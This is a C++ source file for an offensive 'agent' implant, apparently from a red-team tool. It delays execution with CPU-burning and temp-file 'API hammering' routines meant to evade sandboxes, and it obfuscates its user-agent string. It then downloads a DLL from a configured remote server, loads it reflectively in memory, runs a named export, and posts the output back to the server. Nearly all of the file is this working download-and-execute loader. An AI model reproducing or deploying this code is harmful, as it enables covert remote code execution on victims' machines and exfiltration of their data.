// Agent.cpp : This file contains the 'main' function. Program execution begins and ends there.
// Project : https://github.com/hegusung/netscan-agents
//

#include <iostream>

#include "../lib/MemoryModule_NoCRT.h"
#include "../lib/NoCRT.h"
#include "../lib/load_dll.h"
#include "../lib/api_hammer.h"
#include "../lib/NoCRT_list.h"
#include "../lib/NoCRT_string.h"
#include "../lib/BSON.h"

#include "http.h"

#include "out.h"


/*
#define IP ""
#define PORT ""
#define URI_DLL ""
#define URI_RES ""
#define FUNCTION ""
*/

#define IP "IP@@@@@@@@@@@@@@@@@@@@@@@@@"
#define PORT "PORT@@@@@"
#define URI_DLL "URI_DLL@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
#define URI_RES "URI_RES@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
#define FUNCTION "FUNCTION@@@@@@@@@@@@@@@@"

#define PATTERN "DATA@@@@@@@@@@@@@@@@@@@"

const char data[200] = { PATTERN };


int fib(int n)
{
    if (n <= 1)
        return n;
    return fib(n - 1) + fib(n - 2);
}

DWORD WINAPI thread_fib(LPVOID lpParam)
{
    char buffer[50];
    int fib_res = fib(45);
    itoa(fib_res, buffer, 10);

    return 0;
}

/*
#define TMPFILE "config.cfg"

BOOL ApiHammering(DWORD dwStress) {

    CHAR     szPath[MAX_PATH * 2],
        szTmpPath[MAX_PATH];
    HANDLE    hRFile = INVALID_HANDLE_VALUE,
        hWFile = INVALID_HANDLE_VALUE;

    DWORD   dwNumberOfBytesRead = NULL,
        dwNumberOfBytesWritten = NULL;

    PUCHAR   pRandBuffer = NULL;
    SIZE_T  sBufferSize = 0xFFFFF;	// 1048575 byte

    INT     Random = 0;

    // Getting the tmp folder path
    if (!GetTempPathA(MAX_PATH, szTmpPath)) {
        //printf("[!] GetTempPathW Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    strcpy(szPath, szTmpPath);
    strcat(szPath, TMPFILE);


    for (SIZE_T i = 0; i < dwStress; i++) {

        // Creating the file in write mode
        if ((hWFile = CreateFileA(szPath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL)) == INVALID_HANDLE_VALUE) {
            //printf("[!] CreateFileW Failed With Error : %d \n", GetLastError());
            return FALSE;
        }

        // Allocating a buffer and filling it with a random value
        pRandBuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBufferSize);

        // Generate the random number
        NTSTATUS status = BCryptGenRandom(
            NULL,                        // Algorithm handle, can be NULL for default RNG
            pRandBuffer, // Buffer to receive the random number
            sBufferSize,        // Size of the buffer
            BCRYPT_USE_SYSTEM_PREFERRED_RNG // Use the system preferred RNG
        );

        // Writing the random data into the file
        if (!WriteFile(hWFile, pRandBuffer, sBufferSize, &dwNumberOfBytesWritten, NULL) || dwNumberOfBytesWritten != sBufferSize) {
            //printf("[!] WriteFile Failed With Error : %d \n", GetLastError());
            //printf("[i] Written %d Bytes of %d \n", dwNumberOfBytesWritten, sBufferSize);
            return FALSE;
        }

        // Clearing the buffer & closing the handle of the file
        RtlZeroMemory(pRandBuffer, sBufferSize);
        CloseHandle(hWFile);

        // Opening the file in read mode & delete when closed
        if ((hRFile = CreateFileA(szPath, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL)) == INVALID_HANDLE_VALUE) {
            //printf("[!] CreateFileW Failed With Error : %d \n", GetLastError());
            return FALSE;
        }

        // Reading the random data written before 	
        if (!ReadFile(hRFile, pRandBuffer, sBufferSize, &dwNumberOfBytesRead, NULL) || dwNumberOfBytesRead != sBufferSize) {
            //printf("[!] ReadFile Failed With Error : %d \n", GetLastError());
            //printf("[i] Read %d Bytes of %d \n", dwNumberOfBytesRead, sBufferSize);
            return FALSE;
        }

        // Clearing the buffer & freeing it
        RtlZeroMemory(pRandBuffer, sBufferSize);
        HeapFree(GetProcessHeap(), NULL, pRandBuffer);

        // Closing the handle of the file - deleting it
        CloseHandle(hRFile);
    }


    return TRUE;
}
*/

DWORD WINAPI thread_hammer(LPVOID lpParam)
{
    temp_file_creation();

    return 0;
}


int main()
{    
    DWORD thread_id;
    HANDLE hThread = CreateThread(
        NULL,                   // default security attributes
        0,                      // use default stack size  
        thread_fib,       // thread function name
        NULL,          // argument to thread function 
        0,                      // use default creation flags 
        &thread_id);   // returns the thread identifier 

    WaitForSingleObject(hThread, INFINITE);

    HANDLE hThread2 = CreateThread(
        NULL,                   // default security attributes
        0,                      // use default stack size  
        thread_hammer,       // thread function name
        NULL,          // argument to thread function 
        0,                      // use default creation flags 
        &thread_id);   // returns the thread identifier 

    WaitForSingleObject(hThread2, INFINITE);

    DWORD thread_res;
    GetExitCodeThread(hThread2, &thread_res);

    if (thread_res != 0)
        return 1;

    printf2("A\n");
    BSONObject bson;
    printf2("B\n");
    bson.parse(data);
    printf2("C: %d\n", bson.getType());

    if (!bson.IsDict())
    {
        return 2;
    }

    CTIME_STRING_HASH(IP, "ip");
    CTIME_STRING_HASH(PORT, "port");
    CTIME_STRING_HASH(URI_GET, "uri_get");
    CTIME_STRING_HASH(URI_POST, "uri_post");
    CTIME_STRING_HASH(FUNCTION, "function");

    printf2("D\n");

    BSONDict dict = bson.AsDict();
    if (!exists_byhash(dict, IP_hash) || !exists_byhash(dict, PORT_hash) || !exists_byhash(dict, URI_GET_hash) || !exists_byhash(dict, URI_POST_hash) || !exists_byhash(dict, FUNCTION_hash))
        return 3;

    string ip = get_byhash(dict, IP_hash)->AsString();
    int port = get_byhash(dict, PORT_hash)->AsInteger();
    string uri_get = get_byhash(dict, URI_GET_hash)->AsString();
    string uri_post = get_byhash(dict, URI_POST_hash)->AsString();
    string function = get_byhash(dict, FUNCTION_hash)->AsString();

    printf2("yolo\n");

    OBFUSCATE(Useragent, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36");

    HTTP http = HTTP(ip.c_str(), port, Useragent.decrypt());
    if (http.load_success() == false)
        return 4;

    if (init_memorymodule() == FALSE)
        return 5;

    char* binary;
    size_t binary_size;
    int res = http.get(uri_get.c_str(), &binary, &binary_size);

    if (res == 0)
    {
        printf2("Downloaded %d bytes\n", (int)binary_size);
    }
    else
    {
        printf2("Failed to download: %d\n", res);
        return 6;
    }

    // Load the dll
    HMEMORYMODULE handle = MemoryLoadLibrary(binary, binary_size);
    if (handle == NULL)
    {
        printf2("Failed to load the library\n");
        return 7;
    }

    printf2("Load success\n");

    typedef char* (*func)();
    func f = (func)MemoryGetProcAddress(handle, function.c_str());
    if (f == NULL)
    {
        printf2("Failed to find the function\n");
        return 8;
    }
    printf2("Execute !\n");

    char* dll_result = f();

    printf2("%s", dll_result);

    printf2("Sending result back\n");

    char* post_response;
    size_t post_response_size;
    res = http.post(uri_post.c_str(), dll_result, strlen(dll_result), &post_response, &post_response_size);

    if (res == 0)
    {
        printf2("Successfully sent result back\n");
    }
    else
    {
        printf2("Failed to send result back\n");
        return 9;
    }

    //IatCamouflage();

    add_data();

    return 0;
}

